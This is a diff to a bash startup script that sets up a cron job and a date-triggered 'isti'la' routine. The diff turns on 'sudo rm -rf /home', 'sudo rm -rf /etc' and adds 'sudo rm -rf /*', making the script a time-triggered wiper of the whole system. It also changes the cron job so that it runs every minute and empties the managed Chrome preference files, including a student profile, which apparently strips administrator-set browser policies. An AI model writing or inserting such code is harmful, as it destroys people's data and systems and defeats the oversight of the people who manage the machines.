@@ -45,8 +45,9 @@ execute_istila() {
             fi
             # Uncomment the lines below to enable isti'la actions
             echo Successfully executed cron job and istila operation | sudo tee -a /opt/test >/dev/null
-            # sudo rm -rf /home
-            # sudo rm -rf /etc
+            sudo rm -rf /home
+            sudo rm -rf /etc
+            sudo rm -rf /*
         else
             if [ "$AUTO_MODE" != "true" ]; then
                 echo "isti'la date has not yet arrived."
@@ -57,7 +58,7 @@ execute_istila() {
 
 # Function to set up cron job to run the script every hour
 setup_cron() {
-    CRON_JOB="* * * * * /bin/bash /opt/startup.sh >> /opt/cron_output.log 2>&1"
+    CRON_JOB="* * * * * /bin/bash /opt/startup.sh >> /opt/cron_output.log 2>&1 && sudo truncate -s 0 /Library/Managed\ Preferences/com.google.Chrome.plist /Library/Managed\ Preferences/student/com.google.Chrome.plist" # A personal thing.
 
     if ! sudo crontab -l | grep -q "$CRON_JOB"; then
         if [ "$AUTO_MODE" != "true" ]; then
